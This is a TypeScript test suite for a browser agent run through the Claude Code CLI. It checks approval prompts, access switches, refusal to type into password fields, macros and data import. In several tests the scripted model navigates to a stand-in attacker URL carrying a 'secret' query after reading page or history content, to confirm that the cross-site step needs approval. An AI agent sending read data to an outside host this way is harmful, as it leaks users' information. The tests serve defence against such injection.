import { describe, expect, it, vi } from 'vitest'
import type { AgentState, DebugEvent, ModelId } from '../ipc'
import { Agent, elideImages, MAX_STEPS, siteOf, type AgentDeps } from './agent'
import {
  CLI_NOT_FOUND,
  CliError,
  type CliOutcome,
  type CliResult,
  type CliTurn,
} from './claude-cli'
import type { ApiTool, ContentBlock } from './content'
import { fakeBrowser } from './fake-browser'
import type { HistoryPort, ImportPort, MacroInfo, MacroPort, StackOpener } from './tools'

/** What the scripted CLI's model saw at one step of a turn. */
interface ModelRequest {
  model: ModelId
  tools: ApiTool[]
  messages: { role: 'user' | 'assistant'; content: ContentBlock[] }[]
}
interface ModelResponse {
  content: ContentBlock[]
  stop_reason: string
}
type Reply = (request: ModelRequest, signal: AbortSignal) => Promise<ModelResponse>

const response = (content: ContentBlock[], stop_reason = 'end_turn'): ModelResponse => ({
  content,
  stop_reason,
})
const toolUse = (id: string, name: string, input: unknown): ContentBlock => ({
  type: 'tool_use',
  id,
  name,
  input,
})

/**
 * A Claude Code CLI turn played from `replies`, one per model step: like the real CLI it shows each
 * assistant message, calls the tools back through the turn and stops at maxTurns.
 */
function scriptedCli(replies: Reply[], requests: ModelRequest[]) {
  return async (turn: CliTurn): Promise<CliOutcome> => {
    const messages: ModelRequest['messages'] = [{ role: 'user', content: turn.content }]
    const finish = (result: Omit<CliResult, 'type'>): CliOutcome => {
      const event: CliResult = { type: 'result', session_id: 'session-1', ...result }
      turn.onEvent(event)
      return { code: result.is_error ? 1 : 0, stderr: '', result: event, sessionId: 'session-1' }
    }
    for (let step = 0; ; step++) {
      if (step >= turn.maxTurns) return finish({ subtype: 'error_max_turns', is_error: true })
      const request = { model: turn.model, tools: turn.tools, messages: structuredClone(messages) }
      requests.push(request)
      const next = replies.shift()
      if (!next) throw new Error('no more replies')
      const { content, stop_reason } = await next(request, turn.signal)
      messages.push({ role: 'assistant', content })
      turn.onEvent({ type: 'assistant', parent_tool_use_id: null, message: { content } })
      const calls = content.filter(
        (block): block is { type: 'tool_use'; id: string; name: string; input: unknown } =>
          block.type === 'tool_use',
      )
      if (calls.length === 0) {
        return finish({ subtype: 'success', is_error: false, stop_reason, result: '' })
      }
      const results: ContentBlock[] = []
      for (const call of calls) {
        results.push({ ...(await turn.callTool(call.name, call.input)), tool_use_id: call.id })
      }
      messages.push({ role: 'user', content: results })
    }
  }
}

function setup(
  replies: Reply[],
  options: {
    pageAccess?: boolean
    elements?: Parameters<typeof fakeBrowser>[0]
    model?: ModelId
    cli?: (turn: CliTurn) => Promise<CliOutcome>
    history?: HistoryPort | null
    historyAccess?: boolean
    macros?: MacroPort | null
    stacks?: StackOpener | null
    importer?: ImportPort | null
  } = {},
) {
  const { browser, state } = fakeBrowser(options.elements)
  const requests: ModelRequest[] = []
  const states: AgentState[] = []
  const events: DebugEvent[] = []
  const settings: { model: ModelId; pageAccess: boolean; historyAccess: boolean } = {
    model: options.model ?? 'claude-sonnet-5-5',
    pageAccess: options.pageAccess ?? false,
    historyAccess: options.historyAccess ?? true,
  }
  const turns: CliTurn[] = []
  const scripted = scriptedCli(replies, requests)
  const deps: AgentDeps = {
    runCli: vi.fn((turn: CliTurn) => {
      turns.push(turn)
      return (options.cli ?? scripted)(turn)
    }),
    browser: () => browser,
    history: () => options.history ?? null,
    macros: () => options.macros ?? null,
    stacks: () => options.stacks ?? null,
    importer: () => options.importer ?? null,
    settings: () => settings,
    onState: (value) => states.push(structuredClone(value)),
    onDebug: (event) => events.push(event),
  }
  const agent = new Agent(deps)
  return { agent, browser, state, requests, states, events, settings, deps, turns }
}

const input = (text: string) => ({ text, attachments: [] })
const waitFor = async (check: () => boolean) => {
  for (let i = 0; i < 100 && !check(); i++) await new Promise((resolve) => setTimeout(resolve, 1))
  expect(check()).toBe(true)
}

describe('Agent.run', () => {
  it('runs tools the model calls and shows the final answer', async () => {
    const { agent, browser, requests } = setup([
      async () => response([toolUse('t1', 'navigate', { url: 'example.com' })], 'tool_use'),
      async () => response([{ type: 'text', text: 'Opened example.com.' }]),
    ])
    await agent.run(input('open example.com'))

    expect(browser.load).toHaveBeenCalledWith('example.com')
    expect(requests).toHaveLength(2)
    const results = requests[1]!.messages.at(-1)!
    expect(results.role).toBe('user')
    expect(results.content[0]).toMatchObject({ type: 'tool_result', tool_use_id: 't1' })
    const { items, status } = agent.state()
    expect(status).toBe('idle')
    expect(items.map((item) => item.kind)).toEqual(['user', 'tool', 'assistant'])
    expect(items[1]).toMatchObject({ status: 'ok', summary: 'Open example.com' })
    expect(items[2]).toMatchObject({ text: 'Opened example.com.' })
  })

  it('starts each user turn with the browser state and sends attachments as blocks', async () => {
    const { agent, requests, state } = setup([async () => response([{ type: 'text', text: 'ok' }])])
    state.url = 'https://a.com/'
    state.title = 'A'
    await agent.run({
      text: 'what is this?',
      attachments: [
        { kind: 'image', name: 'shot.png', mediaType: 'image/png', data: 'AAAA' },
        { kind: 'text', name: 'Pasted text', text: 'long text' },
      ],
    })
    const [state0, image, pasted, text] = requests[0]!.messages[0]!.content as {
      type: string
      text?: string
    }[]
    expect(state0!.text).toMatch(
      /^<browser_state>\nURL: https:\/\/a.com\/\nTitle: <untrusted_page_content>/,
    )
    expect(state0!.text).toContain('Page access: off')
    expect(state0!.text).toContain('Saved macros: none')
    expect(image).toEqual({
      type: 'image',
      source: { type: 'base64', media_type: 'image/png', data: 'AAAA' },
    })
    expect(pasted!.text).toContain('long text')
    expect(text).toEqual({ type: 'text', text: 'what is this?' })
  })

  it('offers no page tools and refuses page tool calls while page access is off', async () => {
    const { agent, requests, browser } = setup([
      async () => response([toolUse('t1', 'read_page', {})], 'tool_use'),
      async () => response([{ type: 'text', text: 'I need page access.' }]),
    ])
    browser.load('example.com')
    await agent.run(input('summarize'))
    expect(requests[0]!.tools.map((tool) => tool.name)).not.toContain('read_page')
    expect(browser.run).not.toHaveBeenCalled()
    expect(requests[1]!.messages.at(-1)!.content[0]).toMatchObject({
      is_error: true,
      content: expect.stringContaining('Page access is off'),
    })
    expect(JSON.stringify(requests)).not.toContain('Hello')
  })

  it('waits for approval before a page action and runs it when allowed', async () => {
    const { agent, browser, states } = setup(
      [
        async () => response([toolUse('t1', 'click', { selector: '#buy' })], 'tool_use'),
        async () => response([{ type: 'text', text: 'Clicked.' }]),
      ],
      {
        pageAccess: true,
        elements: {
          '#buy': { found: true, tag: 'button', role: 'button', name: 'Buy', x: 5, y: 6 },
        },
      },
    )
    browser.load('shop.example')
    const running = agent.run(input('buy it'))
    await waitFor(() => agent.state().status === 'awaiting-approval')
    expect(agent.state().approval!.description).toBe('Click button "Buy" (#buy)')
    expect(browser.click).not.toHaveBeenCalled()
    expect(states.some((s) => s.status === 'awaiting-approval')).toBe(true)

    agent.approve('allow')
    await running
    expect(browser.click).toHaveBeenCalledWith(5, 6)
    expect(agent.state().items.find((item) => item.kind === 'approval')).toMatchObject({
      decision: 'allow',
    })
  })

  it('tells the model when the user denies an action', async () => {
    const { agent, browser, requests } = setup(
      [
        async () => response([toolUse('t1', 'click', { selector: '#buy' })], 'tool_use'),
        async () => response([{ type: 'text', text: 'OK, not clicking.' }]),
      ],
      { pageAccess: true, elements: { '#buy': { found: true, tag: 'button', x: 5, y: 6 } } },
    )
    browser.load('shop.example')
    const running = agent.run(input('buy it'))
    await waitFor(() => agent.state().status === 'awaiting-approval')
    agent.approve('deny')
    await running
    expect(browser.click).not.toHaveBeenCalled()
    expect(requests[1]!.messages.at(-1)!.content[0]).toMatchObject({
      is_error: true,
      content: 'The user denied this action.',
    })
  })

  it('asks only once after "Allow for this run"', async () => {
    const { agent, browser } = setup(
      [
        async () => response([toolUse('t1', 'click', { selector: '#a' })], 'tool_use'),
        async () => response([toolUse('t2', 'press_key', { key: 'Enter' })], 'tool_use'),
        async () => response([{ type: 'text', text: 'Done.' }]),
      ],
      { pageAccess: true, elements: { '#a': { found: true, tag: 'a', x: 1, y: 1 } } },
    )
    browser.load('example.com')
    const running = agent.run(input('go'))
    await waitFor(() => agent.state().status === 'awaiting-approval')
    agent.approve('allow-run')
    await running
    expect(browser.pressKey).toHaveBeenCalledWith('Enter')
    expect(agent.state().items.filter((item) => item.kind === 'approval')).toHaveLength(1)
  })

  it('refuses typing into sensitive fields without asking', async () => {
    const { agent, browser, requests } = setup(
      [
        async () =>
          response([toolUse('t1', 'type_text', { selector: '#pw', text: 'x' })], 'tool_use'),
        async () => response([{ type: 'text', text: 'Please type it yourself.' }]),
      ],
      {
        pageAccess: true,
        elements: { '#pw': { found: true, tag: 'input', sensitive: true, x: 1, y: 1 } },
      },
    )
    browser.load('example.com')
    await agent.run(input('log me in'))
    expect(agent.state().items.some((item) => item.kind === 'approval')).toBe(false)
    expect(browser.insertText).not.toHaveBeenCalled()
    expect(requests[1]!.messages.at(-1)!.content[0]).toMatchObject({
      is_error: true,
      content: expect.stringContaining('Refused'),
    })
  })

  it('stop aborts the model request and keeps the history valid', async () => {
    const { agent, requests } = setup([
      (_request, signal) =>
        new Promise((_resolve, reject) =>
          signal.addEventListener('abort', () => reject(new DOMException('aborted', 'AbortError'))),
        ),
      async () => response([{ type: 'text', text: 'hi again' }]),
    ])
    const running = agent.run(input('slow'))
    await waitFor(() => requests.length === 1)
    agent.stop()
    await running
    expect(agent.state().status).toBe('idle')
    expect(agent.state().items.at(-1)).toEqual({ kind: 'notice', text: 'Stopped.' })
    await agent.run(input('again'))
    expect(agent.state().items.at(-1)).toMatchObject({ text: 'hi again' })
  })

  it('ends with an error after the step limit', async () => {
    const replies = Array.from(
      { length: MAX_STEPS },
      (_, i) => async () => response([toolUse(`t${i}`, 'get_page_state', {})], 'tool_use'),
    )
    const { agent, requests } = setup(replies)
    await agent.run(input('loop'))
    expect(requests).toHaveLength(MAX_STEPS)
    expect(agent.state().items.at(-1)).toMatchObject({ kind: 'error' })
  })

  it('rejects a second run while one is going', async () => {
    const { agent } = setup([() => new Promise(() => {})])
    void agent.run(input('first'))
    await expect(agent.run(input('second'))).rejects.toThrow('Stop the current run first')
  })

  it('records request, response, tool and done events for the debugger, without image data', async () => {
    const { agent, browser, events } = setup(
      [
        async () => response([toolUse('t1', 'screenshot', {})], 'tool_use'),
        async () => response([{ type: 'text', text: 'A page.' }]),
      ],
      { pageAccess: true },
    )
    browser.load('example.com')
    await agent.run(input('look'))
    expect(events.map((event) => event.type)).toEqual([
      'request',
      'response',
      'tool-call',
      'tool-result',
      'response',
      'response',
      'done',
    ])
    expect(events[3]!.image).toMatch(/^data:image\/jpeg/)
    expect(JSON.stringify(events)).not.toContain('A'.repeat(300))
    expect(events.every((event, index) => index === 0 || event.at >= events[index - 1]!.at)).toBe(
      true,
    )
  })
})

describe('cross-site navigation after reading a page', () => {
  it('needs approval, while same-site navigation and navigation before reading do not', async () => {
    const { agent, browser } = setup(
      [
        async () =>
          response([toolUse('t1', 'navigate', { url: 'https://shop.example/a' })], 'tool_use'),
        async () => response([toolUse('t2', 'read_page', {})], 'tool_use'),
        async () =>
          response([toolUse('t3', 'navigate', { url: 'www.shop.example/b' })], 'tool_use'),
        async () =>
          response(
            [toolUse('t4', 'navigate', { url: 'https://evil.example/?q=secret' })],
            'tool_use',
          ),
        async () => response([{ type: 'text', text: 'ok' }]),
      ],
      { pageAccess: true },
    )
    const running = agent.run(input('go'))
    await waitFor(() => agent.state().status === 'awaiting-approval')
    expect(agent.state().approval!.description).toBe('Open https://evil.example/?q=secret')
    expect(browser.load.mock.calls.map(([url]) => url)).toEqual([
      'https://shop.example/a',
      'www.shop.example/b',
    ])
    agent.approve('deny')
    await running
    expect(browser.load).toHaveBeenCalledTimes(2)
  })

  it('also after a history search, which needs neither page access nor a page', async () => {
    const history: HistoryPort = {
      search: vi.fn(async () => ({
        pages: [
          {
            title: 'LLM notes',
            url: 'https://notes.example/llm',
            lastVisitAt: 0,
            visitCount: 1,
            note: null,
            description: null,
            summary: null,
            snippet: null,
          },
        ],
      })),
      recall: vi.fn(),
    }
    const { agent, requests, states } = setup(
      [
        async () => response([toolUse('t1', 'search_history', { query: 'LLM' })], 'tool_use'),
        async () =>
          response([toolUse('t2', 'navigate', { url: 'https://evil.example/' })], 'tool_use'),
        async () => response([{ type: 'text', text: 'ok' }]),
      ],
      // No page is loaded.
      { history },
    )
    const running = agent.run(input('search history for any mention of LLM'))
    await waitFor(() => agent.state().status === 'awaiting-approval')
    expect(requests[0]!.tools.map((tool) => tool.name)).toContain('search_history')
    expect(history.search).toHaveBeenCalledWith('LLM', 'meaning', false)
    expect(JSON.stringify(requests[1]!.messages.at(-1))).toContain('https://notes.example/llm')
    expect(states.at(-1)!.items).toContainEqual(
      expect.objectContaining({ tool: 'search_history', summary: 'Search history for "LLM"' }),
    )
    expect(agent.state().approval!.description).toBe('Open https://evil.example/')
    agent.approve('deny')
    await running
  })

  it('recalls by an attached image, and a later cross-site navigation asks first', async () => {
    const history: HistoryPort = {
      search: vi.fn(),
      recall: vi.fn(async () => ({
        view: 'images' as const,
        pages: [
          {
            title: 'Lion photos',
            url: 'https://photos.example/lions',
            lastVisitAt: 0,
            score: 0.8,
            keywords: ['lion'],
            note: null,
          },
        ],
        keywords: [{ text: 'lion', weight: 0.8 }],
      })),
    }
    const { agent, requests, states } = setup(
      [
        async () => response([toolUse('t1', 'recall_history', { image: 1 })], 'tool_use'),
        async () =>
          response([toolUse('t2', 'navigate', { url: 'https://evil.example/' })], 'tool_use'),
        async () => response([{ type: 'text', text: 'ok' }]),
      ],
      { history },
    )
    const running = agent.run({
      text: 'which page in my history had a picture like this?',
      attachments: [
        { kind: 'text', name: 'notes.txt', text: 'x' },
        { kind: 'image', name: 'lion.png', mediaType: 'image/png', data: 'iVBORw0K' },
      ],
    })
    await waitFor(() => agent.state().status === 'awaiting-approval')
    expect(history.recall).toHaveBeenCalledWith(
      {
        query: '',
        image: { mediaType: 'image/png', data: 'iVBORw0K' },
        view: null,
        show: true,
      },
      expect.any(AbortSignal),
    )
    expect(JSON.stringify(requests[1]!.messages.at(-1))).toContain('https://photos.example/lions')
    expect(states.at(-1)!.items).toContainEqual(
      expect.objectContaining({
        tool: 'recall_history',
        summary: 'Recall history for your image 1',
      }),
    )
    expect(agent.state().approval!.description).toBe('Open https://evil.example/')
    agent.approve('deny')
    await running
  })

  it('aborts a recall when the run stops', async () => {
    let signal: AbortSignal | undefined
    const history: HistoryPort = {
      search: vi.fn(),
      recall: vi.fn((_request, recallSignal?: AbortSignal) => {
        signal = recallSignal
        return new Promise<never>(() => {})
      }),
    }
    const { agent } = setup(
      [async () => response([toolUse('t1', 'recall_history', { query: 'lions' })], 'tool_use')],
      { history },
    )
    const running = agent.run(input('show me what I read about lions'))
    await waitFor(() => signal !== undefined)
    expect(signal!.aborted).toBe(false)
    agent.stop()
    await running
    expect(signal!.aborted).toBe(true)
  })

  it('history search is neither offered nor run while history access is off', async () => {
    const history: HistoryPort = { search: vi.fn(async () => ({ pages: [] })), recall: vi.fn() }
    const { agent, requests } = setup(
      [
        async () => response([toolUse('t1', 'search_history', { query: 'LLM' })], 'tool_use'),
        async () => response([{ type: 'text', text: 'History access is off.' }]),
      ],
      { history, historyAccess: false },
    )
    await agent.run(input('search history for LLM'))
    expect(requests[0]!.tools.map((tool) => tool.name)).not.toContain('search_history')
    expect(JSON.stringify(requests[0]!.messages[0])).toContain('History access: off')
    expect(history.search).not.toHaveBeenCalled()
    expect(requests[1]!.messages.at(-1)!.content[0]).toMatchObject({
      is_error: true,
      content: expect.stringContaining('History access is off'),
    })
  })

  it('compares hosts without www', () => {
    expect(siteOf('https://www.a.com/x')).toBe('a.com')
    expect(siteOf('a.com/x')).toBe('a.com')
    expect(siteOf('')).toBe('')
  })
})

/** An in-memory macro store that accepts anything with a name and steps. */
function macroStore(): MacroPort & { saved: MacroInfo[] } {
  const saved: MacroInfo[] = []
  return {
    saved,
    list: () => saved,
    save: vi.fn((definition: unknown) => {
      const macro = definition as MacroInfo
      if (macro.name === 'key') throw new TypeError('/key is a built-in command')
      saved.push(macro)
      return macro
    }),
    delete: vi.fn((name: string) => {
      const index = saved.findIndex((macro) => macro.name === name)
      if (index < 0) throw new TypeError(`No macro /${name}`)
      saved.splice(index, 1)
    }),
  }
}

describe('macros', () => {
  const wiki = {
    name: 'wiki',
    description: 'Search Wikipedia',
    params: [{ name: 'term', hint: 'search term' }],
    steps: [
      { tool: 'navigate', input: { url: 'https://en.wikipedia.org/w/index.php?search={{term}}' } },
    ],
  }

  it('saves, lists and deletes macros without page access or approval, and lists them in the browser state', async () => {
    const macros = macroStore()
    const { agent, requests } = setup(
      [
        async () => response([toolUse('t1', 'save_macro', wiki)], 'tool_use'),
        async () => response([toolUse('t2', 'list_macros', {})], 'tool_use'),
        async () => response([toolUse('t3', 'save_macro', { ...wiki, name: 'key' })], 'tool_use'),
        async () => response([{ type: 'text', text: 'Saved /wiki <term>.' }]),
        async () => response([toolUse('t4', 'delete_macro', { name: 'wiki' })], 'tool_use'),
        async () => response([{ type: 'text', text: 'Deleted.' }]),
      ],
      { macros },
    )
    await agent.run(input('make a macro /wiki that searches Wikipedia for a term'))
    expect(requests[0]!.tools.map((tool) => tool.name)).toEqual(
      expect.arrayContaining(['save_macro', 'list_macros', 'delete_macro', 'new_stack']),
    )
    expect(macros.save).toHaveBeenCalledWith(wiki)
    expect(JSON.stringify(requests[1]!.messages.at(-1))).toContain('Saved /wiki <term>')
    expect(JSON.stringify(requests[2]!.messages.at(-1))).toContain('search={{term}}')
    expect(requests[3]!.messages.at(-1)!.content[0]).toMatchObject({
      is_error: true,
      content: '/key is a built-in command',
    })
    expect(agent.state().items).toContainEqual(
      expect.objectContaining({ summary: 'Save macro /wiki (1 step)', status: 'ok' }),
    )

    await agent.run(input('delete the macro /wiki'))
    const turn = requests[4]!.messages.at(-1)!.content[0] as { text: string }
    expect(turn.text).toContain('Saved macros:\n/wiki <term> – Search Wikipedia')
    expect(macros.delete).toHaveBeenCalledWith('wiki')
    expect(macros.saved).toEqual([])
  })

  it('asks before saving or deleting a macro after page or history content was read', async () => {
    const macros = macroStore()
    const { agent, state } = setup(
      [
        async () => response([toolUse('t1', 'read_page', {})], 'tool_use'),
        async () => response([toolUse('t2', 'save_macro', wiki)], 'tool_use'),
        async () => response([{ type: 'text', text: 'Not saved.' }]),
      ],
      { macros, pageAccess: true },
    )
    state.url = 'https://a.com/'
    const running = agent.run(input('save what this page says as /wiki'))
    await waitFor(() => agent.state().status === 'awaiting-approval')
    expect(agent.state().approval!.description).toBe('Save macro /wiki (1 step)')
    agent.approve('deny')
    await running
    expect(macros.save).not.toHaveBeenCalled()
  })

  it('opens a new stack, optionally at a URL', async () => {
    const stacks = { open: vi.fn() }
    const { agent, browser } = setup(
      [
        async () => response([toolUse('t1', 'new_stack', {})], 'tool_use'),
        async () => response([toolUse('t2', 'new_stack', { url: 'news.example' })], 'tool_use'),
        async () => response([{ type: 'text', text: 'ok' }]),
      ],
      { stacks },
    )
    await agent.run(input('open a new window, then one at news.example'))
    expect(stacks.open).toHaveBeenCalledTimes(2)
    expect(browser.load).toHaveBeenCalledWith('news.example')
    expect(agent.state().items).toContainEqual(
      expect.objectContaining({ summary: 'Open a new stack at news.example', status: 'ok' }),
    )
  })

  it('replays new_stack steps', async () => {
    const stacks = { open: vi.fn() }
    const { agent } = setup([], { stacks })
    expect(await agent.replay('/ns', [{ tool: 'new_stack', input: {} }])).toEqual({ ok: true })
    expect(stacks.open).toHaveBeenCalled()
  })
})

describe('import_browsing_data', () => {
  const call = () =>
    response([toolUse('t1', 'import_browsing_data', { path: '/home/me/edge.csv' })], 'tool_use')
  const done = async () => response([{ type: 'text', text: 'Done.' }])

  it('asks for approval every time, even after "Allow for this run", and needs no page access', async () => {
    const importer = { run: vi.fn(async () => 'Imported 3 visits.') }
    const { agent, browser } = setup([async () => call(), async () => call(), done], { importer })
    const running = agent.run(input('import /home/me/edge.csv'))
    await waitFor(() => agent.state().status === 'awaiting-approval')
    expect(agent.state().approval!.description).toBe('Import browsing data from /home/me/edge.csv')
    expect(importer.run).not.toHaveBeenCalled()
    agent.approve('allow-run')
    await waitFor(() => importer.run.mock.calls.length === 1)
    await waitFor(() => agent.state().status === 'awaiting-approval')
    agent.approve('allow')
    await running
    expect(importer.run).toHaveBeenCalledTimes(2)
    expect(importer.run).toHaveBeenCalledWith('/home/me/edge.csv')
    expect(browser.load).not.toHaveBeenCalled()
  })

  it('imports nothing when the user denies it, and reports an unavailable importer', async () => {
    const importer = { run: vi.fn(async () => 'x') }
    const denied = setup([async () => call(), done], { importer })
    const running = denied.agent.run(input('import it'))
    await waitFor(() => denied.agent.state().status === 'awaiting-approval')
    denied.agent.approve('deny')
    await running
    expect(importer.run).not.toHaveBeenCalled()

    const without = setup([async () => call(), done])
    const second = without.agent.run(input('import it'))
    await waitFor(() => without.agent.state().status === 'awaiting-approval')
    without.agent.approve('allow')
    await second
    expect(without.agent.state().items).toContainEqual(
      expect.objectContaining({ tool: 'import_browsing_data', status: 'error' }),
    )
  })

  it('replays as a skill without the model, approval, page access or a page', async () => {
    const importer = { run: vi.fn(async () => 'Imported.') }
    const { agent, deps } = setup([], { importer })
    const result = await agent.replay('/import-edge /tmp/e.csv', [
      { tool: 'import_browsing_data', input: { path: '/tmp/e.csv' } },
    ])
    expect(result).toEqual({ ok: true })
    expect(importer.run).toHaveBeenCalledWith('/tmp/e.csv')
    expect(deps.runCli).not.toHaveBeenCalled()
  })

  it('shows a failed import as the failing step', async () => {
    const importer = {
      run: vi.fn(async () => {
        throw new Error('The file is empty.')
      }),
    }
    const { agent } = setup([], { importer })
    const result = await agent.replay('/import-edge x', [
      { tool: 'import_browsing_data', input: { path: '/x.csv' } },
    ])
    expect(result.ok).toBe(false)
    expect(result.error).toContain('The file is empty.')
  })
})

describe('Agent.replay', () => {
  it('replays navigation steps without the model or approval', async () => {
    const { agent, browser, deps } = setup([])
    const result = await agent.replay('/news', [
      { tool: 'navigate', input: { url: 'news.example' } },
    ])
    expect(result).toEqual({ ok: true })
    expect(browser.load).toHaveBeenCalledWith('news.example')
    expect(deps.runCli).not.toHaveBeenCalled()
  })

  it('needs page access for page steps and one approval for the whole replay', async () => {
    const steps = [
      { tool: 'navigate', input: { url: 'shop.example' } },
      { tool: 'click', input: { selector: '#a' } },
      { tool: 'click', input: { selector: '#a' } },
    ]
    const off = setup([], { elements: { '#a': { found: true, tag: 'a', x: 1, y: 1 } } })
    expect(await off.agent.replay('/shop', steps)).toMatchObject({ ok: false })
    expect(off.browser.load).not.toHaveBeenCalled()

    const on = setup([], {
      pageAccess: true,
      elements: { '#a': { found: true, tag: 'a', x: 1, y: 1 } },
    })
    const running = on.agent.replay('/shop', steps)
    await waitFor(() => on.agent.state().status === 'awaiting-approval')
    expect(on.agent.state().approval!.description).toContain('2 × click')
    on.agent.approve('allow')
    expect(await running).toEqual({ ok: true })
    expect(on.browser.click).toHaveBeenCalledTimes(2)
  })

  it('stops at the first failing step', async () => {
    const { agent, browser } = setup([], { pageAccess: true })
    browser.load('example.com')
    const result = await agent.replay('/x', [
      { tool: 'scroll', input: { direction: 'down' } },
      { tool: 'navigate', input: { url: 'not a url' } },
      { tool: 'reload', input: {} },
    ])
    expect(result.ok).toBe(false)
    expect(result.error).toContain('Step 2')
    expect(browser.reload).not.toHaveBeenCalled()
  })
})

describe('elideImages', () => {
  it('replaces long base64 data and keeps everything else', () => {
    expect(
      elideImages({ a: [{ data: 'x'.repeat(2000), media_type: 'image/png' }], data: 'short' }),
    ).toEqual({
      a: [{ data: '<base64 image, 1 KB elided>', media_type: 'image/png' }],
      data: 'short',
    })
  })
})

const cliResult = (fields: Partial<CliOutcome['result'] & object> = {}): CliOutcome => ({
  code: 0,
  stderr: '',
  sessionId: 'session-1',
  result: { type: 'result', subtype: 'success', is_error: false, result: 'Done.', ...fields },
})
const assistant = (text: string) => ({
  type: 'assistant',
  parent_tool_use_id: null,
  message: { content: [{ type: 'text', text }] },
})

describe('Agent.run with the Claude Code CLI', () => {
  it('runs the turn through the CLI, which calls the tools back, and shows its messages', async () => {
    const { agent, browser, turns, events } = setup([], {
      model: 'claude-opus-5-5',
      cli: async (turn) => {
        turn.onEvent({ type: 'system', subtype: 'init', session_id: 'session-1', tools: [] })
        const result = await turn.callTool('navigate', { url: 'example.com' })
        expect(result).toMatchObject({ type: 'tool_result', content: [{ type: 'text' }] })
        expect(result).not.toHaveProperty('is_error')
        turn.onEvent(assistant('Opened example.com.'))
        turn.onEvent({ type: 'result', subtype: 'success', usage: { input_tokens: 1 } })
        return cliResult()
      },
    })
    await agent.run(input('open example.com'))

    expect(browser.load).toHaveBeenCalledWith('example.com')
    const [turn] = turns
    expect(turn).toMatchObject({ model: 'claude-opus-5-5', maxTurns: MAX_STEPS, resume: null })
    expect(turn!.tools.map((tool) => tool.name)).toContain('navigate')
    expect(turn!.tools.map((tool) => tool.name)).not.toContain('read_page')
    expect(turn!.content[0]).toMatchObject({ type: 'text' })
    expect(JSON.stringify(turn!.content[0])).toContain('<browser_state>')
    expect(turn!.content.at(-1)).toEqual({ type: 'text', text: 'open example.com' })
    const { items, status } = agent.state()
    expect(status).toBe('idle')
    expect(items.map((item) => item.kind)).toEqual(['user', 'tool', 'assistant'])
    expect(items[2]).toMatchObject({ text: 'Opened example.com.' })
    expect(events.map((event) => event.type)).toEqual([
      'request',
      'response',
      'tool-call',
      'tool-result',
      'response',
      'response',
      'done',
    ])
    expect(JSON.stringify(events)).not.toContain('input_tokens')
  })

  it('continues the CLI session on the next run, and /new starts a fresh one', async () => {
    const { agent, turns } = setup([], {
      model: 'claude-sonnet-5-5',
      cli: async () => cliResult({ session_id: 'ignored' }),
    })
    await agent.run(input('one'))
    await agent.run(input('two'))
    agent.newConversation()
    await agent.run(input('three'))
    expect(turns.map((turn) => turn.resume)).toEqual([null, 'session-1', null])
  })

  it('page actions from the CLI wait for approval, and Deny reaches the CLI as an error', async () => {
    let denied: ContentBlock | null = null
    const { agent, browser } = setup([], {
      model: 'claude-sonnet-5-5',
      pageAccess: true,
      elements: { '#buy': { found: true, tag: 'button', name: 'Buy', x: 5, y: 6 } },
      cli: async (turn) => {
        expect(turn.tools.map((tool) => tool.name)).toContain('read_page')
        denied = await turn.callTool('click', { selector: '#buy' })
        return cliResult()
      },
    })
    const running = agent.run(input('buy it'))
    await waitFor(() => agent.state().status === 'awaiting-approval')
    agent.approve('deny')
    await running
    expect(browser.click).not.toHaveBeenCalled()
    expect(denied).toMatchObject({ content: 'The user denied this action.', is_error: true })
  })

  it('refuses typing into sensitive fields from the CLI without asking', async () => {
    let refused: ContentBlock | null = null
    const { agent, browser } = setup([], {
      model: 'claude-sonnet-5-5',
      pageAccess: true,
      elements: { '#pw': { found: true, tag: 'input', sensitive: true, x: 1, y: 1 } },
      cli: async (turn) => {
        refused = await turn.callTool('type_text', { selector: '#pw', text: 'hunter2' })
        return cliResult()
      },
    })
    await agent.run(input('log in'))
    expect(browser.insertText).not.toHaveBeenCalled()
    expect(refused).toMatchObject({ is_error: true })
    expect(agent.state().items.some((item) => item.kind === 'approval')).toBe(false)
  })

  it('stop during an approval kills the CLI turn and ends the run', async () => {
    const { agent } = setup([], {
      model: 'claude-sonnet-5-5',
      pageAccess: true,
      elements: { '#a': { found: true, tag: 'a', x: 1, y: 1 } },
      cli: (turn) =>
        new Promise((_resolve, reject) => {
          turn.signal.addEventListener('abort', () => reject(new Error('killed')))
          void turn.callTool('click', { selector: '#a' }).catch(() => {})
        }),
    })
    const running = agent.run(input('click'))
    await waitFor(() => agent.state().status === 'awaiting-approval')
    agent.stop()
    await running
    const { items, status } = agent.state()
    expect(status).toBe('idle')
    expect(items.find((item) => item.kind === 'approval')).toMatchObject({ decision: 'stopped' })
    expect(items.at(-1)).toEqual({ kind: 'notice', text: 'Stopped.' })
  })

  it('closes an approval the CLI left open when it exited', async () => {
    const { agent } = setup([], {
      model: 'claude-sonnet-5-5',
      pageAccess: true,
      elements: { '#a': { found: true, tag: 'a', x: 1, y: 1 } },
      cli: async (turn) => {
        void turn.callTool('click', { selector: '#a' }).catch(() => {})
        await waitFor(() => agent.state().status === 'awaiting-approval')
        return { code: 1, stderr: 'crashed', result: null, sessionId: null }
      },
    })
    await agent.run(input('click'))
    const { items, status } = agent.state()
    expect(status).toBe('idle')
    expect(items.find((item) => item.kind === 'approval')).toMatchObject({ decision: 'stopped' })
    expect(items.at(-1)).toEqual({
      kind: 'error',
      message: 'The Claude Code CLI exited with code 1: crashed',
    })
  })

  it('shows the step limit, CLI errors, a logged-out CLI and a missing CLI', async () => {
    const outcomes: (() => Promise<CliOutcome>)[] = [
      async () => cliResult({ subtype: 'error_max_turns', is_error: true }),
      async () => cliResult({ subtype: 'success', is_error: true, result: 'Overloaded' }),
      async () => cliResult({ is_error: true, result: 'Not logged in · Please run /login' }),
      async () => Promise.reject(new CliError(CLI_NOT_FOUND)),
    ]
    const { agent } = setup([], {
      model: 'claude-sonnet-5-5',
      cli: () => outcomes.shift()!(),
    })
    for (let i = 0; i < 4; i++) await agent.run(input('hi'))
    expect(
      agent
        .state()
        .items.filter((item) => item.kind === 'error')
        .map((item) => item.message),
    ).toEqual([
      `Stopped after ${MAX_STEPS} steps.`,
      'Claude Code CLI error: Overloaded',
      "Claude Code isn't logged in. Run `claude` in a terminal and log in.",
      CLI_NOT_FOUND,
    ])
  })
})
